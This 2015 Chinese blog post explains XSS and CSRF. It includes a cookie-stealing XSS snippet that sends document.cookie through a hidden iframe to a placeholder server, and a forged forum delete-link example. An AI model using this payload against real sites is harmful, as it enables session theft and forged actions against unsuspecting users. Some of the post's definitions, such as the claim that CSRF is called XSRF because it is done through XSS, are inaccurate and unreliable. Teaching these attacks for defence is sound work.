---
layout: post
title:  "xss csrf 捋之"
date:   2015-11-29 16:48:52 +0800
categories: jekyll update
---

XSS： 通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！

CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。

> XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但他们两个是不同维度的东西（或者说他们的目的是不一样的）。 XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。

通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。 XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。

### XSS
那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：

````
// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```

此段代码携带着cookie信息传输给了 http://192.168.123.123/myxss/... 这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些xxx的代码，如把用户信息存进自己的数据库）。


这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。

### CSRF

最简单的CSRF攻击（没有用到XSS的哦）：一个论坛，经过多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X" 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X" ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况。既然删除操作可以伪造，那么只要细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）都可以伪造！
